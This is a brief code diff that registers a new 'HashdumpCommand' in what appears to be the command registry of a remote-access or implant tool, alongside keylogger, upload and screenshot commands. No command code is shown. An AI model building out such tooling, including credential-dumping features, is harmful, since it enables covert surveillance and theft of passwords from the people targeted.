@@ -5,6 +5,7 @@ from .keylogger import KeyloggerCommand
 from .upload import UploadCommand
 from .screenshot import ScreenshotCommand
 from .search import SearchCommand
+from .hashdump import HashdumpCommand
 
 
 class CommandRegistry:
@@ -18,6 +19,7 @@ class CommandRegistry:
         self.register(UploadCommand())
         self.register(ScreenshotCommand())
         self.register(SearchCommand())
+        self.register(HashdumpCommand())
 
     def register(self, command):
         self.commands[command.name] = command
